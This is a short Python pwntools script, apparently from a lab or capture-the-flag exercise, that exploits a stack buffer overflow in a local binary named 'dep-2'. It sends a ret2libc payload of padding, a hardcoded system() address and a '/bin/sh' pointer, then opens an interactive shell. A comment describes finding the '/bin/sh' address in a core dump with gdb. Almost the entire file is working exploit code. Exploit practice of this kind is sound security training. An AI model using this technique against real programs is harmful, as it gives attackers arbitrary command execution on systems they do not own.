#!/usr/bin/env python

from pwn import *

# create process and run the program
p = process("./dep-2")
system_addr = p32(0xf7e39da0)
c = Core("./core")
param = c.stack.find("/bin/sh")
print(param)

buff = "A" * 0x88 +"BBBB" +system_addr +"CCCC" + p32(0xf7f5aa0b)

'''
Generate a core by overflowing buffer and p.wait()
run
gdb -core ./core
then search '/bin/sh'
Then you have your address

'''

# send data with newline
p.sendline(buff)

#p.sendline("A" * 0x90)
#p.wait()


# open an interactive console to the program
p.interactive()